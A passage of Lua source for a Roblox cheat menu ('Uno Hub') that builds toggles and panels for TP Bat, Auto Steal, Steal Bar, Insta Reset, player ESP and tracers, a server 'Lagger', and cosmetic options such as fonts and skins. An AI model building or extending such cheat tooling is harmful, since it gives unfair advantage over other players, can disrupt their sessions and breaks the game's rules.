	beginKeybind(tpBatInlineBind, "TP Bat")
	end)
	table.insert(_allBindBtns, tpBatInlineBind)
	local previousTPBatUpdater = toggleVisualUpdaters["TP Bat"]
	toggleVisualUpdaters["TP Bat"] = function()
	if previousTPBatUpdater then pcall(previousTPBatUpdater) end
	local key = FeatureKeybinds["TP Bat"]
	tpBatInlineBind.Text = key and keybindDisplayName(key) or "-"
	tpBatInlineBind.BackgroundColor3 = C.accentDim
	tpBatInlineBind:SetAttribute("CurtThemeRole", "AccentDim")
	tpBatInlineBind.BackgroundTransparency = 0.25
	tpBatInlineBind.TextColor3 = C.text
	end

	local tpBatConfigPanel = Instance.new("Frame")
	tpBatConfigPanel.Name = "TPBatConfigPanel"
	tpBatConfigPanel.Size = UDim2.new(1, -16, 0, 78)
	tpBatConfigPanel.Position = UDim2.new(0, 8, 0, isMobile and 42 or 54)
	tpBatConfigPanel.BackgroundColor3 = C.bgDark
	tpBatConfigPanel:SetAttribute("CurtThemeRole", "BgDark")
	tpBatConfigPanel.BackgroundTransparency = 0.16
	tpBatConfigPanel.BorderSizePixel = 0
	tpBatConfigPanel.Visible = false
	tpBatConfigPanel.ZIndex = 8
	tpBatConfigPanel.Parent = tpBatUiRow
	corner(tpBatConfigPanel, 8); stroke(tpBatConfigPanel, C.divider, 1)

	local function tpBatConfigText(text, y)
	local label = keepOriginalText(Instance.new("TextLabel"))
	label.Size = UDim2.new(1, -100, 0, 34)
	label.Position = UDim2.new(0, 10, 0, y)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = C.textMuted
	label.TextSize = 9
	label.Font = Enum.Font.GothamBold
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.ZIndex = 9
	label.Parent = tpBatConfigPanel
	return label
	end
	tpBatConfigText("DISTANCIA TP (STUDS)", 2)
	tpBatConfigText("VERSION TP BAT", 40)

	local tpBatDistanceBox = keepOriginalText(Instance.new("TextBox"))
	tpBatDistanceBox.Size = UDim2.new(0, 72, 0, 26)
	tpBatDistanceBox.Position = UDim2.new(1, -82, 0, 6)
	tpBatDistanceBox.BackgroundColor3 = C.row
	tpBatDistanceBox:SetAttribute("CurtThemeRole", "Row")
	tpBatDistanceBox.BorderSizePixel = 0
	tpBatDistanceBox.ClearTextOnFocus = false
	tpBatDistanceBox.Text = tostring(_G.__tpBatV2Distance or 8)
	tpBatDistanceBox.TextColor3 = C.text
	tpBatDistanceBox.TextSize = 10
	tpBatDistanceBox.Font = Enum.Font.GothamBold
	tpBatDistanceBox.TextXAlignment = Enum.TextXAlignment.Center
	tpBatDistanceBox.ZIndex = 10
	tpBatDistanceBox.Parent = tpBatConfigPanel
	corner(tpBatDistanceBox, 5); stroke(tpBatDistanceBox, Color3.fromRGB(70, 85, 105), 1)

	local tpBatVersionBox = keepOriginalText(Instance.new("TextButton"))
	tpBatVersionBox.Size = UDim2.new(0, 72, 0, 26)
	tpBatVersionBox.Position = UDim2.new(1, -82, 0, 44)
	tpBatVersionBox.BackgroundColor3 = C.accentDim
	tpBatVersionBox:SetAttribute("CurtThemeRole", "AccentDim")
	tpBatVersionBox.BorderSizePixel = 0
	tpBatVersionBox.TextColor3 = C.text
	tpBatVersionBox.TextSize = 10
	tpBatVersionBox.Font = Enum.Font.GothamBold
	tpBatVersionBox.ZIndex = 10
	tpBatVersionBox.Parent = tpBatConfigPanel
	tpBatVersionBox.Visible = true
	corner(tpBatVersionBox, 5); stroke(tpBatVersionBox, Color3.fromRGB(70, 85, 105), 1)

	local function refreshVisibleTPBatConfig()
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	tpBatVersionBox.Text = "V" .. tostring(_G.__batVersion or 1)
	tpBatVersionBox.BackgroundColor3 = C.accentDim
	tpBatVersionBox:SetAttribute("CurtThemeRole", "AccentDim")

	tpBatDistanceBox.TextEditable = true
	tpBatDistanceBox.Text = tostring(_G.__tpBatV2Distance or 8)
	tpBatDistanceBox.BackgroundTransparency = 0
	tpBatDistanceBox.TextColor3 = C.text
	end
	_G.__UnoRefreshVisibleTPBatConfig = refreshVisibleTPBatConfig
	refreshVisibleTPBatConfig()

	local tpBatConfigOpen = false
	local function setVisibleTPBatConfig(open)
	tpBatConfigOpen = open == true
	tpBatConfigPanel.Visible = tpBatConfigOpen
	tpBatUiRow.Size = UDim2.new(1, 0, 0, tpBatConfigOpen and (isMobile and 124 or 140) or MODERN.toggleH)
	tpBatConfigToggle.BackgroundColor3 = tpBatConfigOpen and C.accent or C.accentDim
	tpBatConfigTrack.BackgroundColor3 = tpBatConfigOpen and C.accent or Color3.fromRGB(30, 31, 35)
	tpBatConfigKnob.BackgroundColor3 = tpBatConfigOpen and Color3.fromRGB(245, 248, 255) or Color3.fromRGB(155, 165, 180)
	tpBatConfigKnob.Position = tpBatConfigOpen and UDim2.new(1, -10, 0.5, -4) or UDim2.new(0, 2, 0.5, -4)
	end
	tpBatConfigToggle.MouseButton1Click:Connect(function()
	setVisibleTPBatConfig(not tpBatConfigOpen)
	end)

	tpBatDistanceBox.FocusLost:Connect(function()
	_G.UnoAutoBat.SetV2Distance(tpBatDistanceBox.Text)
	end)
	tpBatVersionBox.MouseButton1Click:Connect(function()
	_G.UnoAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
	refreshVisibleTPBatConfig()
	end)

	-- This hub uses the standalone Cursed TP Bat keybind (default: P).  The
	-- old version/distance panel is removed because the direct engine has none.
	_G.__UnoRefreshVisibleTPBatConfig = function() end
	tpBatUiRow.Size = UDim2.new(1, 0, 0, MODERN.toggleH)
	pcall(function() tpBatConfigToggle:Destroy() end)
	pcall(function() tpBatConfigPanel:Destroy() end)
	toggleRow(combat, "Steal Bar", "Steal Bar", true, 11, false, function(on)
		setFeature("Steal Bar", on)
	end)
	sectionLabel(combat, "ACTIONS", 12)
	do
	actionRow(combat, "Drop Brainrot", "Drop", 13, function()
	if FeatureToggles.Drop then pcall(FeatureToggles.Drop, "button") end
	end)

	end
	local tpDownActionRow = actionRow(combat, "TP Down", "TP Down", 14, function() if FeatureToggles["TP Down"] then pcall(FeatureToggles["TP Down"]) end end)
	local tpDownKeybind = tpDownActionRow:FindFirstChild("TPDownKeybind")
	if tpDownKeybind then
	tpDownKeybind.Position = UDim2.new(1, isMobile and -39 or -48, 0.5, isMobile and -9 or -11)
	end
	actionRow(combat, "Insta Reset", "Insta Reset", 15, function() if FeatureToggles["Insta Reset"] then pcall(FeatureToggles["Insta Reset"]) end end)
	sectionLabel(combat, "AUTO STEAL", 16)
	local _, autoGrabUiRow = toggleRow(combat, "Auto Steal", "auto steal", toggleStates["auto steal"], 17, false, function(on) setFeature("auto steal", on) end)

	local autoStealModeBtn = modeButton(autoGrabUiRow, string.upper(autoStealMode), function()
	autoStealMode = (autoStealMode == "v2") and "v1" or "v2"
	if toggleStates["auto steal"] and FeaturePostToggle["auto steal"] then
	pcall(FeaturePostToggle["auto steal"], false)
	pcall(FeaturePostToggle["auto steal"], true)
	end
	if type(_G.__UnoRefreshStealBarModePill) == "function" then
		pcall(_G.__UnoRefreshStealBarModePill)
	end
	saveConfig()
	return string.upper(autoStealMode)
	end)
	_G.__UnoRefreshAutoStealModeUI = function(mode)
		if autoStealModeBtn and autoStealModeBtn.Parent then
			autoStealModeBtn.Text = string.upper(tostring(mode or autoStealMode or "v1"))
		end
	end
	inputRow(combat, "Steal Radius", autoStealValues.Radius, 18, function(value) autoStealValues.Radius = math.clamp(math.floor(value), 10, 150); saveConfig() end)

	local visual = pages.Visual
	sectionLabel(visual, "VISUAL", -2)
	toggleRow(visual, "Anti Lag", "Anti Lag", toggleStates["Anti Lag"], -1, false, function(on) setFeature("Anti Lag", on) end)
	toggleRow(visual, "ESP Players", "ESP Players", toggleStates["ESP Players"], 1, false, function(on)
	setFeature("ESP Players", on)
	end)
	toggleRow(visual, "ESP Line", "Player Tracers", toggleStates["Player Tracers"], 2, false, function(on)
	setFeature("Player Tracers", on)
	end)
	toggleRow(visual, "Stretch Rez", "Stretchz Res", toggleStates["Stretchz Res"], 4, false, function(on) setFeature("Stretchz Res", on) end)
	sectionLabel(visual, "FOV", 5)
	toggleRow(visual, "Custom FOV", "Custom FOV", toggleStates["Custom FOV"], 6, false, function(on)
	setFeature("Custom FOV", on)
	end)
	inputRow(visual, "FOV", speedValues.FOV, 7, function(value)
	speedValues.FOV = math.clamp(math.floor(value), 30, 120)
	setFeature("Custom FOV", true)
	if FeaturePostToggle["Custom FOV"] then pcall(FeaturePostToggle["Custom FOV"], true) end
	local camera = workspace.CurrentCamera; if camera then camera.FieldOfView = speedValues.FOV end
	saveConfig()
	end)
	sectionLabel(visual, "SKY", 8)
	local _, skyThemesUiRow = toggleRow(visual, "Sky Themes", "Sky Changer", toggleStates["Sky Changer"], 9, false, function(on)
	setFeature("Sky Changer", on)
	end)
	modeButton(skyThemesUiRow, string.upper(skyCurrentMode or "blue"), function()
	if skyCurrentMode == "day" then
	skyCurrentMode = "blue"
	elseif skyCurrentMode == "blue" then
	skyCurrentMode = "night"
	else
	 skyCurrentMode = "day"
	end
	_G.__UnoSkyChangerMode = skyCurrentMode
	if toggleStates["Sky Changer"] then applySky(skyCurrentMode) end
	saveConfig()
	return string.upper(skyCurrentMode)
	end)
	local batSkinRow = actionRow(visual, "Custom Bat Skin", nil, 9.5, function() end)
	local visualBatSkinLabels = { ["Default"] = "DEFAULT", ["Abyss Blue"] = "BLUE", ["Venom Green"] = "GREEN", ["Royal Gold"] = "GOLD", ["Velvet Rose"] = "ROSE", ["Crimson Night"] = "CRIMSON", ["RGB"] = "RGB" }
	local batSkinButton = modeButton(batSkinRow, visualBatSkinLabels[batSkinMode] or "DEFAULT", function()
		local current = 1
		for index, mode in ipairs(_G.__UnoBatSkinModes or {}) do if mode == batSkinMode then current = index; break end end
		local modes = _G.__UnoBatSkinModes or { "Default" }
		local nextMode = modes[(current % #modes) + 1]
		local selected = _G.__UnoBatSkinSet and _G.__UnoBatSkinSet(nextMode) or nextMode
		return visualBatSkinLabels[selected] or selected
	end)
	sectionLabel(visual, "APPEARANCE", 10)

	do
	local appearanceUi = {}
	appearanceUi.add = function(label, featureName, order)
		local ref = {}
		ref.update, ref.row = toggleRow(visual, label, featureName, toggleStates[featureName], order, false, function(on)
			setFeature(featureName, on)
		end)
		ref.refresh = function()
			ref.update(toggleStates[featureName] == true)
		end
		toggleVisualUpdaters[featureName] = ref.refresh
		ref.refresh()
	end
	appearanceUi.add("Custom Skins", "Violette Custom Skins", 11)
	actionRow(visual, "Choose Skin", nil, 12, function()
		if _G._KawatanOpenSkinGallery then pcall(_G._KawatanOpenSkinGallery) end
	end)
	appearanceUi.add("Headless", "Headless Visual", 13)
	appearanceUi.add("Korblox", "Korblox Visual", 14)
	end
	sectionLabel(visual, "GUI", 15)
	do
		local colorNames = { "RED", "PINK", "BLUE" }
		local colorRow = actionRow(visual, "Image/colore", nil, 15, function() end)
		local colorModeButton
		colorModeButton = modeButton(colorRow, colorNames[bgIndex] or "RED", function()
			bgIndex = (tonumber(bgIndex) or 1) + 1
			if bgIndex > #backgroundIds then bgIndex = 1 end
			_G["_UnoHub_UI_BgIndex"] = bgIndex
			if BgImage then BgImage.Image = backgroundIds[bgIndex] end
			if background then
				background.Image = backgroundIds[bgIndex]
				if _G.__UnoApplyMainBgFrame then pcall(_G.__UnoApplyMainBgFrame, background, bgIndex) end
			end
			if _G.__UnoApplyCurtVisualTheme then pcall(_G.__UnoApplyCurtVisualTheme, bgIndex) end
			if type(_G.__UnoSetStealBarParticles) == "function" then
				pcall(_G.__UnoSetStealBarParticles, bgIndex == 2, bgIndex)
			end
			if type(_G.__UnoApplyAutoStealBarTheme) == "function" then
				pcall(_G.__UnoApplyAutoStealBarTheme, bgIndex)
			end
			saveConfig()
			return colorNames[bgIndex]
		end)
		colorModeButton.Name = "ScriptColorMode"
		colorModeButton.Position = UDim2.new(1, isMobile and -88 or -102, 0.5, isMobile and -8 or -10)
	end
	do
		-- Custom Font picker (Ambitious-style menu)
		local _, fontRow = toggleRow(visual, "Custom Font", "Custom Font", toggleStates["Custom Font"], 15.1, false, function(on)
			setFeature("Custom Font", on)
			if _G.UnoFonts and _G.UnoFonts.set then
				pcall(_G.UnoFonts.set, _G.UnoFontChoice or "Default")
			end
		end)
		local fontPickerGui = nil
		local function closeFontPicker()
			if fontPickerGui and fontPickerGui.Parent then
				local frame = fontPickerGui:FindFirstChild("Frame")
				if frame then
					local tw = TweenService:Create(frame, TweenInfo.new(0.18), {BackgroundTransparency = 1})
					tw:Play()
					tw.Completed:Connect(function()
						pcall(function() if fontPickerGui then fontPickerGui:Destroy() end end)
						fontPickerGui = nil
					end)
				else
					pcall(function() fontPickerGui:Destroy() end)
					fontPickerGui = nil
				end
			end
		end
		_G.__UnoFontPickerClose = closeFontPicker

		local pickBtn = modeButton(fontRow, "PICK", function()
			if fontPickerGui and fontPickerGui.Parent then
				closeFontPicker()
				return "PICK"
			end

			local parentGui = ScreenGui
			fontPickerGui = Instance.new("ScreenGui")
			fontPickerGui.Name = "UnoHubFontPicker"
			fontPickerGui.ResetOnSpawn = false
			fontPickerGui.IgnoreGuiInset = true
			fontPickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			fontPickerGui.DisplayOrder = 100000
			fontPickerGui.Parent = parentGui.Parent or parentGui

			local fpBack = Instance.new("TextButton")
			fpBack.Name = "Backdrop"
			fpBack.Size = UDim2.new(1, 0, 1, 0)
			fpBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			fpBack.BackgroundTransparency = 0.45
			fpBack.BorderSizePixel = 0
			fpBack.Text = ""
			fpBack.ZIndex = 1
			fpBack.Parent = fontPickerGui
			fpBack.MouseButton1Click:Connect(closeFontPicker)

			local fpFrame = Instance.new("Frame")
			fpFrame.Name = "Frame"
			fpFrame.Size = UDim2.new(0, 380, 0, 520)
			fpFrame.Position = UDim2.new(0.5, -190, 0.5, -260)
			fpFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
			fpFrame.BorderSizePixel = 0
			fpFrame.ZIndex = 2
			fpFrame.Parent = fontPickerGui
			Instance.new("UICorner", fpFrame).CornerRadius = UDim.new(0, 16)
			local fpStroke = Instance.new("UIStroke", fpFrame)
			fpStroke.Color = (typeof(C) == "table" and C.accent) or Color3.fromRGB(220, 40, 40)
			fpStroke.Thickness = 1.4
			fpStroke.Transparency = 0.25

			local fpBar = Instance.new("Frame")
			fpBar.Size = UDim2.new(1, 0, 0, 48)
			fpBar.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
			fpBar.BorderSizePixel = 0
			fpBar.ZIndex = 3
			fpBar.Parent = fpFrame
			Instance.new("UICorner", fpBar).CornerRadius = UDim.new(0, 16)

			local fpTitle = Instance.new("TextLabel")
			fpTitle.Size = UDim2.new(1, -60, 1, 0)
			fpTitle.Position = UDim2.new(0, 16, 0, 0)
			fpTitle.BackgroundTransparency = 1
			fpTitle.Text = "CUSTOM FONTS"
			fpTitle.TextColor3 = Color3.fromRGB(245, 245, 250)
			fpTitle.Font = Enum.Font.GothamBlack
			fpTitle.TextSize = 15
			fpTitle.TextXAlignment = Enum.TextXAlignment.Left
			fpTitle.ZIndex = 4
			fpTitle.Parent = fpBar
			fpTitle:SetAttribute("UnoFontLock", true)

			local fpClose = Instance.new("TextButton")
			fpClose.Size = UDim2.new(0, 32, 0, 32)
			fpClose.Position = UDim2.new(1, -40, 0.5, -16)
			fpClose.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
			fpClose.BorderSizePixel = 0
			fpClose.Text = "X"
			fpClose.TextColor3 = Color3.fromRGB(255, 255, 255)
			fpClose.Font = Enum.Font.GothamBlack
			fpClose.TextSize = 14
			fpClose.ZIndex = 5
			fpClose.Parent = fpBar
			Instance.new("UICorner", fpClose).CornerRadius = UDim.new(0, 8)
			fpClose:SetAttribute("UnoFontLock", true)
			fpClose.MouseButton1Click:Connect(closeFontPicker)

			local fpScroll = Instance.new("ScrollingFrame")
			fpScroll.Size = UDim2.new(1, -16, 1, -60)
			fpScroll.Position = UDim2.new(0, 8, 0, 52)
			fpScroll.BackgroundTransparency = 1
			fpScroll.BorderSizePixel = 0
			fpScroll.ScrollBarThickness = 4
			fpScroll.ScrollBarImageColor3 = (typeof(C) == "table" and C.accent) or Color3.fromRGB(220, 40, 40)
			fpScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
			fpScroll.ZIndex = 3
			fpScroll.Parent = fpFrame

			local FP_COLS, FP_CELL, FP_GAP = 3, 110, 8
			local FP_STEP = FP_CELL + FP_GAP
			local fpList = {}
			pcall(function()
				if _G.UnoFonts and _G.UnoFonts.list then
					fpList = _G.UnoFonts.list()
				end
			end)
			if type(fpList) ~= "table" or #fpList == 0 then
				fpList = {{ key = "Default", label = "Default", font = nil }}
			end
			local fpRows = math.ceil(#fpList / FP_COLS)
			fpScroll.CanvasSize = UDim2.new(0, 0, 0, 16 + fpRows * FP_STEP)

			local fpPool = {}
			local function fpEntryOf(card)
				local idx = card:GetAttribute("FontIdx")
				return idx and fpList[idx] or nil
			end
			local function fpPaint()
				for _, c in ipairs(fpPool) do
					local e = fpEntryOf(c)
					local sel = e and (_G.UnoFontChoice == e.key)
					local st = c:FindFirstChildOfClass("UIStroke")
					if st then
						st.Color = sel and ((typeof(C) == "table" and C.accent) or Color3.fromRGB(220, 40, 40)) or Color3.fromRGB(60, 60, 70)
						st.Transparency = sel and 0 or 0.45
						st.Thickness = sel and 2.2 or 1.1
					end
				end
			end
			local function fpBind(card, idx)
				local e = fpList[idx]
				if not e then
					card:SetAttribute("FontIdx", nil)
					card.Visible = false
					return
				end
				local row = math.floor((idx - 1) / FP_COLS)
				local col = (idx - 1) % FP_COLS
				card.Position = UDim2.new(0, 6 + col * FP_STEP, 0, 6 + row * FP_STEP)
				card:SetAttribute("FontIdx", idx)
				local prv = card:FindFirstChild("Preview")
				if prv then
					if e.font then
						pcall(function() prv.FontFace = e.font end)
					else
						prv.Font = Enum.Font.GothamBlack
					end
				end
				local nl = card:FindFirstChild("FontName")
				if nl then nl.Text = e.label end
				card.Visible = true
			end

			local poolCount = (math.ceil(456 / FP_STEP) + 2) * FP_COLS
			for j = 1, poolCount do
				local card = Instance.new("TextButton")
				card.Name = "FontCard_" .. tostring(j)
				card.Size = UDim2.new(0, FP_CELL, 0, FP_CELL)
				card.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
				card.BorderSizePixel = 0
				card.Text = ""
				card.AutoButtonColor = false
				card.Visible = false
				card.ZIndex = 4
				card.ClipsDescendants = true
				card.Parent = fpScroll
				Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
				local cardStroke = Instance.new("UIStroke", card)
				cardStroke.Color = Color3.fromRGB(60, 60, 70)
				cardStroke.Thickness = 1.1
				cardStroke.Transparency = 0.45

				local prv = Instance.new("TextLabel")
				prv.Name = "Preview"
				prv.Size = UDim2.new(1, -8, 0, 48)
				prv.Position = UDim2.new(0, 4, 0, 10)
				prv.BackgroundTransparency = 1
				prv.Text = "Aa"
				prv.TextColor3 = Color3.fromRGB(245, 245, 250)
				prv.Font = Enum.Font.GothamBlack
				prv.TextSize = 34
				prv.ZIndex = 5
				prv.Parent = card
				prv:SetAttribute("UnoFontLock", true)

				local nameLbl = Instance.new("TextLabel")
				nameLbl.Name = "FontName"
				nameLbl.Size = UDim2.new(1, -8, 0, 28)
				nameLbl.Position = UDim2.new(0, 4, 1, -32)
				nameLbl.BackgroundTransparency = 1
				nameLbl.Text = ""
				nameLbl.TextColor3 = Color3.fromRGB(180, 180, 190)
				nameLbl.Font = Enum.Font.GothamBold
				nameLbl.TextSize = 9
				nameLbl.TextWrapped = true
				nameLbl.ZIndex = 5
				nameLbl.Parent = card
				nameLbl:SetAttribute("UnoFontLock", true)

				card.MouseButton1Click:Connect(function()
					local e = fpEntryOf(card)
					if not e then return end
					if _G.UnoFonts and _G.UnoFonts.set then
						_G.UnoFontChoice = e.key
						if not toggleStates["Custom Font"] then setFeature("Custom Font", true) end
						pcall(_G.UnoFonts.set, e.key)
					else
						_G.UnoFontChoice = e.key
						if not toggleStates["Custom Font"] then setFeature("Custom Font", true) end
					end
					pcall(function() if saveConfig then saveConfig() end end)
					fpPaint()
				end)
				fpPool[#fpPool + 1] = card
			end

			local fpFirstRow = -1
			local function fpRender()
				local first = math.max(0, math.floor((fpScroll.CanvasPosition.Y - 6) / FP_STEP) - 1)
				if first == fpFirstRow then return end
				fpFirstRow = first
				for j, card in ipairs(fpPool) do
					fpBind(card, first * FP_COLS + j)
				end
				fpPaint()
			end
			fpScroll:GetPropertyChangedSignal("CanvasPosition"):Connect(fpRender)
			fpRender()

			fpFrame.Size = UDim2.fromOffset(0, 0)
			fpFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
			TweenService:Create(fpFrame, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
				Size = UDim2.fromOffset(380, 520),
				Position = UDim2.new(0.5, -190, 0.5, -260),
			}):Play()

			return "PICK"
		end)
		pickBtn.Name = "CustomFontMode"
		task.defer(function()
			task.wait(0.6)
			if _G.UnoFonts and _G.UnoFonts.set and toggleStates["Custom Font"] then
				pcall(_G.UnoFonts.set, _G.UnoFontChoice, true)
			elseif _G.UnoFonts and _G.UnoFonts.set then
				pcall(_G.UnoFonts.set, _G.UnoFontChoice or "Default", true)
			end
		end)
	end
	do
		local tabPositionRow = actionRow(visual, "Tabs Position", nil, 15.25, function() end)
		local tabPositionButton
		tabPositionButton = modeButton(tabPositionRow, _G.__UnoTabPosition == "Left" and "LEFT" or "DOWN", function()
			local nextPosition = _G.__UnoTabPosition == "Left" and "Down" or "Left"
			_G.__UnoSetTabPosition(nextPosition)
			return string.upper(nextPosition)
		end)
		tabPositionButton.Name = "TabsPositionMode"
		tabPositionButton.Position = UDim2.new(1, isMobile and -88 or -102, 0.5, isMobile and -8 or -10)
	end
	local _, halloweenModeRow = toggleRow(visual, "🎃 Halloween Mode 🎃", "Halloween Mode", toggleStates["Halloween Mode"], 15.5, false, function(on)
		setFeature("Halloween Mode", on)
		if _G.__UnoApplyCurtVisualTheme then
			pcall(_G.__UnoApplyCurtVisualTheme, bgIndex)
		end
	end)
	halloweenModeRow.Name = "HalloweenModeRow"
	for _, child in ipairs(halloweenModeRow:GetChildren()) do
		if child:IsA("TextLabel") then
			child.Name = "HalloweenModeLabel"
			child.Text = "🎃 Halloween Mode 🎃"
			child.TextColor3 = Color3.fromRGB(255, 145, 35)
			child.TextStrokeColor3 = Color3.fromRGB(70, 24, 0)
			child.TextStrokeTransparency = 0.55
			child.TextSize = MODERN.textSize + 1
			break
		end
	end
	toggleRow(visual, "Quick Buttons", "Show Buttons", toggleStates["Show Buttons"], 16, false, function(on)
	setFeature("Show Buttons", on)
	end)
	do
	local sizeRow = actionRow(visual, "Buttons Size", nil, 16.5, function() end)
	local sizeBox = keepOriginalText(Instance.new("TextBox"))
	sizeBox.Name = "ButtonsSizeInput"
	sizeBox.Size = UDim2.fromOffset(64, isMobile and 22 or 26)
	sizeBox.AnchorPoint = Vector2.new(1, 0.5)
	sizeBox.Position = UDim2.new(1, -10, 0.5, 0)
	sizeBox.BackgroundColor3 = C.accentDim
	sizeBox:SetAttribute("CurtThemeRole", "AccentDim")
	sizeBox:SetAttribute("CurtThemeAccentInput", true)
	sizeBox.BorderSizePixel = 0
	sizeBox.TextColor3 = C.text
	sizeBox.Font = Enum.Font.GothamBold
	sizeBox.TextSize = 12
	sizeBox.Text = tostring(_G.__UnoButtonsSize or 1)
	sizeBox.PlaceholderText = "0.5 - 2"
	sizeBox.ClearTextOnFocus = false
	sizeBox.ZIndex = 8
	sizeBox.Parent = sizeRow
	corner(sizeBox, 5)
	sizeBox.FocusLost:Connect(function()
		sizeBox.Text = tostring(_G.__UnoSetButtonsSize(sizeBox.Text))
	end)
	end
	actionRow(visual, "reset butons pos.", nil, 17, function()
	_G.__UnoResetButtonPositions()
	if _G.UnoLagger and _G.UnoLagger.ResetPosition then _G.UnoLagger.ResetPosition() end
	end)
	toggleRow(visual, "Lock Buttons", "Lock Buttons", toggleStates["Lock Buttons"], 18, false, function(on)
	setFeature("Lock Buttons", on)
	end)
	actionRow(visual, "Hide GUI Key", "Toggle UI", 19, function() Panel.Visible = false end)
	sectionLabel(visual, "PANELS", 20)
	actionRow(visual, "Open Lagger", nil, 21, function()
	local gui = Player:FindFirstChild("PlayerGui") and Player.PlayerGui:FindFirstChild("UnoLaggerGUI")
	local frame = gui and gui:FindFirstChild("MainFrame")
	if frame then
	local visible = not frame.Visible
	if _G.UnoLagger and _G.UnoLagger.SetVisible then pcall(_G.UnoLagger.SetVisible, visible) else frame.Visible = visible end
	elseif _G.__openLaggerGUI then
	pcall(_G.__openLaggerGUI, true)
	end
	end)

	local animations = pages.Visual
	sectionLabel(animations, "ANIMATION SOURCE", 22)
	local selectedSourcePreset = _G.__UnoAnimationPreset
	if not selectedSourcePreset or not animationPresets[selectedSourcePreset] then
	selectedSourcePreset = selectedAnimationPresetName or animationPresetOrder[1]
	end
	local presetSelector = Instance.new("Frame")
	presetSelector.Size = UDim2.new(1, 0, 0, 42)
	presetSelector.BackgroundColor3 = C.row
	presetSelector:SetAttribute("CurtThemeRole", "Row")
	presetSelector.BackgroundTransparency = 0.5
	presetSelector.BorderSizePixel = 0
	presetSelector.LayoutOrder = 23
	presetSelector.Parent = animations
	corner(presetSelector, 10); stroke(presetSelector, C.divider, 1)
	local previousPresetButton = keepOriginalText(Instance.new("TextButton"))
	previousPresetButton.Size = UDim2.new(0, 42, 1, -8)
	previousPresetButton.Position = UDim2.new(0, 4, 0, 4)
	previousPresetButton.BackgroundColor3 = C.accentDim
	previousPresetButton:SetAttribute("CurtThemeRole", "AccentDim")
	previousPresetButton.BackgroundTransparency = 0.2
	previousPresetButton.BorderSizePixel = 0
	previousPresetButton.Text = "<"
	previousPresetButton.TextColor3 = C.text
	previousPresetButton.TextSize = 18
	previousPresetButton.Font = Enum.Font.GothamBlack
	previousPresetButton.Parent = presetSelector
	corner(previousPresetButton, 7)
	local presetLabel = keepOriginalText(Instance.new("TextLabel"))
	presetLabel.Size = UDim2.new(1, -100, 1, 0)
	presetLabel.Position = UDim2.new(0, 50, 0, 0)
	presetLabel.BackgroundTransparency = 1
	presetLabel.TextColor3 = C.text
	presetLabel.TextSize = 10
	presetLabel.TextWrapped = true
	presetLabel.Font = Enum.Font.GothamBold
	presetLabel.Parent = presetSelector
	local nextPresetButton = keepOriginalText(Instance.new("TextButton"))
	nextPresetButton.Size = UDim2.new(0, 42, 1, -8)
	nextPresetButton.Position = UDim2.new(1, -46, 0, 4)
	nextPresetButton.BackgroundColor3 = C.accentDim
	nextPresetButton:SetAttribute("CurtThemeRole", "AccentDim")
	nextPresetButton.BackgroundTransparency = 0.2
	nextPresetButton.BorderSizePixel = 0
	nextPresetButton.Text = ">"
	nextPresetButton.TextColor3 = C.text
	nextPresetButton.TextSize = 18
	nextPresetButton.Font = Enum.Font.GothamBlack
	nextPresetButton.Parent = presetSelector
	corner(nextPresetButton, 7)
	local function refreshAnimationPresetButton()
	presetLabel.Text = tostring(selectedSourcePreset)
	end
	local function changeSourcePreset(direction)
	local currentIndex = 1
	for index, name in ipairs(animationPresetOrder) do
	if name == selectedSourcePreset then currentIndex = index break end
	end
	currentIndex = currentIndex + direction
	if currentIndex < 1 then currentIndex = #animationPresetOrder end
	if currentIndex > #animationPresetOrder then currentIndex = 1 end
	selectedSourcePreset = animationPresetOrder[currentIndex]
	refreshAnimationPresetButton()
	_G.__UnoAnimationPreset = selectedSourcePreset
	if toggleStates["Animations"] then
		FeaturePostToggle["Animations"](true)
	else
		setFeature("Animations", true)
	end
	pcall(saveConfig)
	end
	previousPresetButton.MouseButton1Click:Connect(function() changeSourcePreset(-1) end)
	nextPresetButton.MouseButton1Click:Connect(function() changeSourcePreset(1) end)
	refreshAnimationPresetButton()
	local function sourceAssetId(value)
	if type(value) == "number" then return "rbxassetid://" .. tostring(value) end
	if type(value) == "string" and string.match(value, "^%d+$") then return "rbxassetid://" .. value end
	return value
	end
	local sourceAnimationOriginals = _G.__UnoOriginalAnimations
	if type(sourceAnimationOriginals) ~= "table" then
	sourceAnimationOriginals = setmetatable({}, {__mode = "k"})
	_G.__UnoOriginalAnimations = sourceAnimationOriginals
	end
	local function captureSourceAnimationOriginals(character, targets, saved)
	saved = saved or {}
	if next(saved) == nil then
		for name, target in pairs(targets) do
			if target then saved[name] = target.AnimationId end
		end
	end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	local ok, description = pcall(function()
		return humanoid and humanoid:GetAppliedDescription()
	end)
	if ok and description then
		local function useDescription(name, property)
			local value = tonumber(description[property])
			if value and value > 0 and targets[name] then
				saved[name] = "rbxassetid://" .. tostring(value)
			end
		end
		useDescription("idle1", "IdleAnimation")
		useDescription("idle2", "IdleAnimation")
		useDescription("walk", "WalkAnimation")
		useDescription("run", "RunAnimation")
		useDescription("jump", "JumpAnimation")
		useDescription("fall", "FallAnimation")
		useDescription("climb", "ClimbAnimation")
		useDescription("swim", "SwimAnimation")
		useDescription("swimidle", "SwimAnimation")
	end
	return saved
	end
	local function applySourcePreset(presetName, restoreOriginal)
	local character = Player.Character
	local animate = character and (character:FindFirstChild("Animate") or character:WaitForChild("Animate", 3))
	if not animate then return false end
	local targets = {
		idle1 = animate:FindFirstChild("idle") and animate.idle:FindFirstChild("Animation1"),
		idle2 = animate:FindFirstChild("idle") and animate.idle:FindFirstChild("Animation2"),
		walk = animate:FindFirstChild("walk") and animate.walk:FindFirstChild("WalkAnim"),
		run = animate:FindFirstChild("run") and animate.run:FindFirstChild("RunAnim"),
